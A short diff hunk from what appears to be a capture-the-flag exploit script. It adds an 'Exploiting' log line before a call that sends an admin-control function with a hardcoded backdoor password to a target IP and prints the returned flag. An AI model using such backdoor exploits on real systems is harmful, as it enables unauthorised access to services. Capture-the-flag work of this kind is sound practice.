@@ -48,6 +48,7 @@ if __name__ == "__main__":
         sys.exit(1)
 
     pwd = b"::svm_kernel::repr_as_byte";
+    print("Exploiting ", args.ip)
     flag = send(RemoteFunction.AdmnCtrl, args.ip, pwd)
     print("Flag through backdoor: ", flag.decode("ascii"))
 
